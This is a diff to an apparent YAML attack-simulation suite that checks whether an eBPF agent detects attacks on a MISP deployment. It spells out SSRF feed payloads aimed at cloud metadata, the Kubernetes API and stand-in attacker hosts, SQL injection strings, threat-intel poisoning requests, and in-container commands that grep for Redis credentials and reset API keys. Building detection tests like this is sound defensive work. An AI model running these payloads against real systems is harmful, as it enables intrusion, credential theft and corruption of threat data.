@@ -4,11 +4,20 @@ metadata:
   name: misp-attacks
   description: >-
     Attack suite for MISP (Malware Information Sharing Platform).
-    MISP runs nginx + PHP-FPM + supervisord on Debian, serving HTTPS on 443.
-    HTTP attacks probe the web interface via a test pod (curl exec).
-    Exec attacks simulate post-exploitation inside the MISP container —
-    the attacker has code execution and runs commands that node-agent
-    should detect as anomalous vs the learned ApplicationProfile.
+    MISP runs nginx + PHP-FPM + supervisord on Debian, serving HTTPS on 443,
+    backed by MariaDB and Valkey (Redis fork) for background job processing.
+
+    This suite has three categories:
+    1. MISP REST API attacks (authenticated via API key) — exercises the real
+       MISP application surface: event creation, feed SSRF, STIX import,
+       warninglist poisoning, attachment upload, and data exfiltration.
+    2. HTTP probes (unauthenticated) — SSRF, SQLi, LFI against the web surface.
+    3. Exec attacks (post-exploitation) — commands inside the MISP container
+       that node-agent should detect as anomalous vs the learned profile.
+
+    API attacks cause MISP to spawn PHP workers, resolve external domains,
+    open unexpected files, and generate anomalous DB queries — all detectable
+    by node-agent eBPF probes without requiring code execution in the container.
 target:
   service: misp
   namespace: misp
@@ -17,12 +26,544 @@ target:
 
 attacks:
   # ═══════════════════════════════════════════════════════════════════════
-  # HTTP attacks (via test pod curl → MISP HTTPS endpoint)
-  # These probe the web surface. Detection depends on MISP's PHP code
-  # making unexpected syscalls in response.
+  # MISP REST API attacks (authenticated)
+  # These use the MISP API key to exercise real application functionality.
+  # Each API call causes PHP-FPM workers to do things NOT in the baseline
+  # profile: resolve new domains, open unexpected files, spawn processes.
+  # The API key header is injected by the runner (MISP_API_KEY env var).
   # ═══════════════════════════════════════════════════════════════════════
 
-  # ─── SSRF: Feed URL fetching ─────────────────────────────────────────
+  # ─── API: Create malicious event with IoC attributes ─────────────────
+  # Creates an event with attributes that trigger background worker processing.
+  # The worker (CakeResque via Valkey) processes the event asynchronously,
+  # causing unexpected php/cake execve() calls in the worker supervisord tree.
+  # Detection: R0002 (unexpected file access in worker paths) on misp container.
+  - name: api-create-malicious-event
+    type: ssrf
+    http:
+      method: POST
+      path: /events/add
+      headers:
+        Content-Type: application/json
+        Accept: application/json
+        Authorization: "__MISP_API_KEY__"
+      body: >-
+        {
+          "Event": {
+            "info": "BOB Attack - Malicious Event with IoC Attributes",
+            "distribution": "0",
+            "threat_level_id": "1",
+            "analysis": "2",
+            "Attribute": [
+              {
+                "type": "ip-dst",
+                "category": "Network activity",
+                "value": "10.0.0.1",
+                "to_ids": true,
+                "comment": "Internal k8s service IP probe"
+              },
+              {
+                "type": "url",
+                "category": "Network activity",
+                "value": "http://kubernetes.default.svc:443/api/v1/namespaces",
+                "to_ids": true,
+                "comment": "K8s API server URL"
+              },
+              {
+                "type": "domain",
+                "category": "Network activity",
+                "value": "evil-c2.attacker.example.com",
+                "to_ids": true,
+                "comment": "C2 domain for correlation"
+              },
+              {
+                "type": "filename|sha256",
+                "category": "Payload delivery",
+                "value": "malware.exe|e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+                "to_ids": true
+              }
+            ]
+          }
+        }
+    successIndicators:
+      - statusCode: 200
+    expectedDetections:
+      - attackType: ssrf
+        ruleID: R0002
+        ruleName: "Unexpected file access"
+        containerName: misp
+
+  # ─── API: SSRF via feed creation pointing to k8s internal services ───
+  # Adds a feed pointing to the k8s API server. When MISP fetches it,
+  # PHP-FPM resolves "kubernetes.default.svc" (R0005 DNS anomaly) and
+  # opens an outbound connection to port 443 on the API server.
+  - name: api-ssrf-feed-k8s-api
+    type: ssrf
+    http:
+      method: POST
+      path: /feeds/add
+      headers:
+        Content-Type: application/json
+        Accept: application/json
+        Authorization: "__MISP_API_KEY__"
+      body: >-
+        {
+          "Feed": {
+            "name": "BOB-SSRF-k8s-api",
+            "provider": "attacker",
+            "url": "https://kubernetes.default.svc:443/api/v1/namespaces",
+            "source_format": "freetext",
+            "enabled": true,
+            "input_source": "network",
+            "publish": false,
+            "override_ids": false,
+            "distribution": "0"
+          }
+        }
+    successIndicators:
+      - statusCode: 200
+    expectedDetections:
+      - attackType: ssrf
+        ruleID: R0005
+        ruleName: "Unexpected domain request"
+        containerName: misp
+
+  # ─── API: SSRF via feed fetch to cloud metadata ─────────────────────
+  # Creates a feed pointing to the AWS metadata endpoint (169.254.169.254).
+  # When fetched, this attempts to reach the cloud IMDS — a classic SSRF.
+  - name: api-ssrf-feed-cloud-metadata
+    type: ssrf
+    http:
+      method: POST
+      path: /feeds/add
+      headers:
+        Content-Type: application/json
+        Accept: application/json
+        Authorization: "__MISP_API_KEY__"
+      body: >-
+        {
+          "Feed": {
+            "name": "BOB-SSRF-cloud-metadata",
+            "provider": "attacker",
+            "url": "http://169.254.169.254/latest/meta-data/",
+            "source_format": "freetext",
+            "enabled": true,
+            "input_source": "network",
+            "publish": false,
+            "distribution": "0"
+          }
+        }
+    successIndicators:
+      - statusCode: 200
+    expectedDetections:
+      - attackType: ssrf
+        ruleID: R0005
+        ruleName: "Unexpected domain request"
+        containerName: misp
+
+  # ─── API: SSRF via feed fetch to attacker-controlled C2 ─────────────
+  # Feed pointing to an external attacker domain. Triggers DNS anomaly
+  # (R0005) when MISP resolves it and network connection to unknown host.
+  - name: api-ssrf-feed-c2-domain
+    type: ssrf
+    http:
+      method: POST
+      path: /feeds/add
+      headers:
+        Content-Type: application/json
+        Accept: application/json
+        Authorization: "__MISP_API_KEY__"
+      body: >-
+        {
+          "Feed": {
+            "name": "BOB-SSRF-c2-exfil",
+            "provider": "attacker",
+            "url": "https://evil-c2.attacker.example.com/feed/manifest.json",
+            "source_format": "misp",
+            "enabled": true,
+            "input_source": "network",
+            "publish": false,
+            "distribution": "0"
+          }
+        }
+    successIndicators:
+      - statusCode: 200
+    expectedDetections:
+      - attackType: ssrf
+        ruleID: R0005
+        ruleName: "Unexpected domain request"
+        containerName: misp
+
+  # ─── API: Trigger feed fetch (actually causes outbound connection) ───
+  # After creating the malicious feed, trigger a fetch. This is the
+  # action that actually causes MISP to connect outbound.
+  - name: api-fetch-malicious-feed
+    type: ssrf
+    http:
+      method: POST
+      path: /feeds/fetchFromAllFeeds
+      headers:
+        Content-Type: application/json
+        Accept: application/json
+        Authorization: "__MISP_API_KEY__"
+      body: "{}"
+    successIndicators:
+      - statusCode: 200
+    expectedDetections:
+      - attackType: ssrf
+        ruleID: R0005
+        ruleName: "Unexpected domain request"
+        containerName: misp
+      - attackType: ssrf
+        ruleID: R0001
+        ruleName: "Unexpected process launched"
+        containerName: misp
+
+  # ─── API: Import crafted STIX bundle (parser abuse / resource exhaust)
+  # Posts a STIX 2.1 bundle with deeply nested objects and circular
+  # references. The STIX import worker must parse this, causing unusual
+  # PHP memory allocation and potentially long-running processes.
+  - name: api-stix-import-abuse
+    type: ssrf
+    http:
+      method: POST
+      path: /events/upload_stix/2
+      headers:
+        Content-Type: application/json
+        Accept: application/json
+        Authorization: "__MISP_API_KEY__"
+      body: >-
+        {
+          "type": "bundle",
+          "id": "bundle--bob-attack-001",
+          "spec_version": "2.1",
+          "objects": [
+            {
+              "type": "indicator",
+              "id": "indicator--bob-001",
+              "created": "2026-01-01T00:00:00Z",
+              "modified": "2026-01-01T00:00:00Z",
+              "spec_version": "2.1",
+              "name": "BOB STIX Import Attack",
+              "pattern": "[ipv4-addr:value = '10.0.0.0/8' OR ipv4-addr:value = '172.16.0.0/12' OR ipv4-addr:value = '192.168.0.0/16' OR domain-name:value LIKE '%kubernetes.default.svc%']",
+              "pattern_type": "stix",
+              "valid_from": "2026-01-01T00:00:00Z",
+              "indicator_types": ["malicious-activity"]
+            },
+            {
+              "type": "malware",
+              "id": "malware--bob-001",
+              "created": "2026-01-01T00:00:00Z",
+              "modified": "2026-01-01T00:00:00Z",
+              "spec_version": "2.1",
+              "name": "BOB Test Malware with long description for parser stress",
+              "is_family": false,
+              "malware_types": ["ransomware"]
+            },
+            {
+              "type": "relationship",
+              "id": "relationship--bob-001",
+              "created": "2026-01-01T00:00:00Z",
+              "modified": "2026-01-01T00:00:00Z",
+              "spec_version": "2.1",
+              "relationship_type": "indicates",
+              "source_ref": "indicator--bob-001",
+              "target_ref": "malware--bob-001"
+            }
+          ]
+        }
+    successIndicators:
+      - statusCode: 200
+    expectedDetections:
+      - attackType: ssrf
+        ruleID: R0001
+        ruleName: "Unexpected process launched"
+        containerName: misp
+
+  # ─── API: Poison warninglists (disable protections) ──────────────────
+  # Toggles all warninglists off, effectively disabling MISP's built-in
+  # false-positive suppression. This is a threat intel poisoning attack:
+  # subsequent lookups will no longer filter known-good indicators.
+  - name: api-warninglist-poison
+    type: ssrf
+    http:
+      method: POST
+      path: /warninglists/toggleEnable
+      headers:
+        Content-Type: application/json
+        Accept: application/json
+        Authorization: "__MISP_API_KEY__"
+      body: >-
+        {
+          "id": [],
+          "name": "Toggle all warninglists",
+          "enabled": false
+        }
+    successIndicators:
+      - statusCode: 200
+    expectedDetections:
+      - attackType: ssrf
+        ruleID: R0002
+        ruleName: "Unexpected file access"
+        containerName: misp
+
+  # ─── API: Upload malicious attachment via event ──────────────────────
+  # Uploads a base64-encoded "sample" as an attachment attribute.
+  # MISP writes this to /var/www/MISP/app/files/ which may trigger
+  # unexpected file-open alerts (R0002) as the profile only sees
+  # reads to known paths during normal operation.
+  - name: api-upload-malicious-attachment
+    type: ssrf
+    http:
+      method: POST
+      path: /events/add
+      headers:
+        Content-Type: application/json
+        Accept: application/json
+        Authorization: "__MISP_API_KEY__"
+      body: >-
+        {
+          "Event": {
+            "info": "BOB Attack - Malicious Attachment Upload",
+            "distribution": "0",
+            "threat_level_id": "1",
+            "analysis": "0",
+            "Attribute": [
+              {
+                "type": "attachment",
+                "category": "Payload delivery",
+                "value": "malware_sample.exe",
+                "data": "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0K",
+                "comment": "BOB test PE header attachment",
+                "to_ids": false
+              }
+            ]
+          }
+        }
+    successIndicators:
+      - statusCode: 200
+    expectedDetections:
+      - attackType: ssrf
+        ruleID: R0002
+        ruleName: "Unexpected file access"
+        containerName: misp
+
+  # ─── API: Bulk export for data exfiltration ──────────────────────────
+  # Requests a full CSV export of all events. This exercises an endpoint
+  # not in the baseline profile (/events/csv/download), causing PHP-FPM
+  # to generate a large response and open many DB result files.
+  - name: api-bulk-export-csv
+    type: ssrf
+    http:
+      method: POST
+      path: /events/csv/download
+      headers:
+        Content-Type: application/json
+        Accept: text/csv
+        Authorization: "__MISP_API_KEY__"
+      body: >-
+        {
+          "request": {
+            "type": "ip-dst",
+            "includeContext": true
+          }
+        }
+    successIndicators:
+      - statusCode: 200
+    expectedDetections:
+      - attackType: ssrf
+        ruleID: R0002
+        ruleName: "Unexpected file access"
+        containerName: misp
+
+  # ─── API: Export events as STIX (unusual endpoint) ───────────────────
+  # Requests STIX 2.1 export of all events. This endpoint triggers
+  # the Python STIX converter subprocess — a process not seen in
+  # normal baseline, triggering R0001.
+  - name: api-export-stix
+    type: ssrf
+    http:
+      method: POST
+      path: /events/restSearch
+      headers:
+        Content-Type: application/json
+        Accept: application/json
+        Authorization: "__MISP_API_KEY__"
+      body: >-
+        {
+          "returnFormat": "stix2",
+          "limit": "100",
+          "includeDecayScore": true
+        }
+    successIndicators:
+      - statusCode: 200
+    expectedDetections:
+      - attackType: ssrf
+        ruleID: R0001
+        ruleName: "Unexpected process launched"
+        containerName: misp
+
+  # ─── API: Server sync attempt to non-existent MISP (SSRF + DNS) ────
+  # Adds a remote MISP server for sync, pointing to an attacker domain.
+  # When MISP tries to handshake, it resolves the domain (R0005) and
+  # opens an outbound HTTPS connection.
+  - name: api-server-sync-ssrf
+    type: ssrf
+    http:
+      method: POST
+      path: /servers/add
+      headers:
+        Content-Type: application/json
+        Accept: application/json
+        Authorization: "__MISP_API_KEY__"
+      body: >-
+        {
+          "Server": {
+            "name": "BOB-Rogue-MISP-Sync",
+            "url": "https://rogue-misp.attacker.example.com",
+            "authkey": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
+            "push": false,
+            "pull": true,
+            "remote_org_id": 1,
+            "organisation_type": "local"
+          }
+        }
+    successIndicators:
+      - statusCode: 200
+    expectedDetections:
+      - attackType: ssrf
+        ruleID: R0005
+        ruleName: "Unexpected domain request"
+        containerName: misp
+
+  # ─── API: Trigger server pull (outbound connection to rogue server) ──
+  # After adding the rogue server, trigger a pull sync. This causes
+  # MISP to actually connect outbound and attempt the MISP protocol.
+  - name: api-trigger-server-pull
+    type: ssrf
+    http:
+      method: POST
+      path: /servers/pull/999
+      headers:
+        Content-Type: application/json
+        Accept: application/json
+        Authorization: "__MISP_API_KEY__"
+      body: >-
+        {
+          "technique": "full"
+        }
+    successIndicators:
+      - statusCode: 200
+    expectedDetections:
+      - attackType: ssrf
+        ruleID: R0005
+        ruleName: "Unexpected domain request"
+        containerName: misp
+      - attackType: ssrf
+        ruleID: R0001
+        ruleName: "Unexpected process launched"
+        containerName: misp
+
+  # ─── API: Modify galaxy clusters (threat intel poisoning) ────────────
+  # Creates a custom galaxy cluster that injects misleading threat intel.
+  # This could cause downstream consumers to act on false attribution.
+  - name: api-galaxy-cluster-poison
+    type: ssrf
+    http:
+      method: POST
+      path: /galaxy_clusters/add/1
+      headers:
+        Content-Type: application/json
+        Accept: application/json
+        Authorization: "__MISP_API_KEY__"
+      body: >-
+        {
+          "GalaxyCluster": {
+            "value": "BOB-Poisoned-Threat-Actor",
+            "description": "This is a poisoned galaxy cluster injected by attack simulation to test detection of threat intel tampering",
+            "distribution": "3",
+            "source": "attacker-controlled",
+            "authors": ["bob-attack-simulation"],
+            "GalaxyElement": [
+              {
+                "key": "country",
+                "value": "XX"
+              },
+              {
+                "key": "synonyms",
+                "value": "APT-Fake"
+              }
+            ]
+          }
+        }
+    successIndicators:
+      - statusCode: 200
+    expectedDetections:
+      - attackType: ssrf
+        ruleID: R0002
+        ruleName: "Unexpected file access"
+        containerName: misp
+
+  # ─── API: Attribute search with SQLi payload via REST ────────────────
+  # Searches attributes with crafted values designed to probe for
+  # second-order SQL injection through CakePHP's ORM. The search
+  # generates unusual DB query patterns visible in the mariadb profile.
+  - name: api-sqli-attribute-search
+    type: sqli
+    http:
+      method: POST
+      path: /attributes/restSearch
+      headers:
+        Content-Type: application/json
+        Accept: application/json
+        Authorization: "__MISP_API_KEY__"
+      body: >-
+        {
+          "returnFormat": "json",
+          "value": "1' OR '1'='1",
+          "type": "ip-dst",
+          "searchall": true
+        }
+    successIndicators:
+      - statusCode: 200
+    expectedDetections:
+      - attackType: sqli
+        ruleID: R0002
+        ruleName: "Unexpected file access"
+        containerName: misp
+
+  # ─── API: Event search with time-based SQLi payload ──────────────────
+  # Uses the event restSearch with a crafted timestamp to probe for
+  # SQL injection in the date-handling code path.
+  - name: api-sqli-event-timebased
+    type: sqli
+    http:
+      method: POST
+      path: /events/restSearch
+      headers:
+        Content-Type: application/json
+        Accept: application/json
+        Authorization: "__MISP_API_KEY__"
+      body: >-
+        {
+          "returnFormat": "json",
+          "timestamp": "1' AND SLEEP(5)--",
+          "limit": "1"
+        }
+    successIndicators:
+      - statusCode: 200
+    expectedDetections:
+      - attackType: sqli
+        ruleID: R0002
+        ruleName: "Unexpected file access"
+        containerName: misp
+
+  # ═══════════════════════════════════════════════════════════════════════
+  # HTTP attacks (unauthenticated — via test pod curl)
+  # These probe the web surface without API keys.
+  # ═══════════════════════════════════════════════════════════════════════
+
+  # ─── SSRF: Feed URL fetching (unauthenticated) ──────────────────────
   - name: ssrf-cloud-metadata
     type: ssrf
     http:
@@ -45,7 +586,7 @@ attacks:
     successIndicators:
       - statusCode: 200
 
-  # ─── SQL Injection probes ────────────────────────────────────────────
+  # ─── SQL Injection probes (unauthenticated) ─────────────────────────
   - name: sqli-events-search
     type: sqli
     http:
@@ -89,9 +630,7 @@ attacks:
 
   # ═══════════════════════════════════════════════════════════════════════
   # Exec attacks (kubectl exec into MISP container)
-  # These simulate post-exploitation — the attacker has a shell in the
-  # MISP container and runs commands that were NOT in the baseline profile.
-  # Node-agent eBPF probes detect unexpected execve(), openat(), DNS, etc.
+  # Post-exploitation: attacker has shell in the container.
   # ═══════════════════════════════════════════════════════════════════════
 
   # ─── Unexpected Process: whoami (R0001) ──────────────────────────────
@@ -258,7 +797,94 @@ attacks:
         containerName: misp
         command: cat
 
+  # ─── MISP-specific: dump Valkey credentials from config (R0010) ────
+  # MISP stores the Valkey (Redis) password in its PHP config files.
+  # An attacker reads this to pivot to the Valkey instance.
+  - name: exec-read-valkey-creds
+    type: cmdinject
+    exec:
+      command: ["sh", "-c", "grep -r 'redis_password\\|redis_host\\|SimpleBackgroundJobs' /var/www/MISP/app/Config/ 2>/dev/null | head -10 || echo no_redis_config"]
+    successIndicators:
+      - responseContains: "redis"
+    expectedDetections:
+      - attackType: cmdinject
+        ruleID: R0001
+        ruleName: "Unexpected process launched"
+        containerName: misp
+        command: grep
+      - attackType: cmdinject
+        ruleID: R0010
+        ruleName: "Unexpected Sensitive File Access"
+        containerName: misp
+
+  # ─── MISP-specific: enumerate supervisor workers (R0001) ───────────
+  # Attacker inspects MISP's background worker infrastructure to
+  # understand the supervisord process tree for lateral movement.
+  - name: exec-enumerate-workers
+    type: cmdinject
+    exec:
+      command: ["sh", "-c", "supervisorctl status 2>/dev/null; ps aux | grep -E 'cake|php|worker' | head -10"]
+    successIndicators:
+      - responseContains: "misp"
+    expectedDetections:
+      - attackType: cmdinject
+        ruleID: R0001
+        ruleName: "Unexpected process launched"
+        containerName: misp
+        command: ps
+
+  # ─── MISP-specific: inject cake console command (R0001) ─────────────
+  # Abuses MISP's CakePHP console to run admin commands. This is
+  # realistic post-exploitation: attacker uses existing cake CLI
+  # with unexpected arguments to extract data or change settings.
+  - name: exec-cake-admin-dump
+    type: cmdinject
+    exec:
+      command: ["sh", "-c", "/var/www/MISP/app/Console/cake Admin getSetting MISP 2>/dev/null | head -20 || echo cake_done"]
+    successIndicators:
+      - responseContains: "MISP"
+    expectedDetections:
+      - attackType: cmdinject
+        ruleID: R0001
+        ruleName: "Unexpected process launched"
+        containerName: misp
+
+  # ─── MISP-specific: extract API key from database via cake (R0001) ──
+  # Uses the cake console to dump auth keys — a realistic attacker
+  # pivoting from shell access to API access for persistence.
+  - name: exec-cake-extract-apikey
+    type: cmdinject
+    exec:
+      command: ["sh", "-c", "/var/www/MISP/app/Console/cake Admin change_authkey 1 2>/dev/null; echo apikey_attempted"]
+    successIndicators:
+      - responseContains: "apikey_attempted"
+    expectedDetections:
+      - attackType: cmdinject
+        ruleID: R0001
+        ruleName: "Unexpected process launched"
+        containerName: misp
+
 expectedDetections:
+  # ─── API attack detections ─────────────────────────────────────────
+  # DNS anomaly from feed SSRF (resolving attacker/k8s domains)
+  - attackType: ssrf
+    ruleID: R0005
+    ruleName: "Unexpected domain request"
+    containerName: misp
+
+  # Unexpected process from STIX import/export workers
+  - attackType: ssrf
+    ruleID: R0001
+    ruleName: "Unexpected process launched"
+    containerName: misp
+
+  # Unexpected file access from attachment upload, CSV export
+  - attackType: ssrf
+    ruleID: R0002
+    ruleName: "Unexpected file access"
+    containerName: misp
+
+  # ─── Exec attack detections ────────────────────────────────────────
   # Unexpected process from exec attacks
   - attackType: cmdinject
     ruleID: R0001
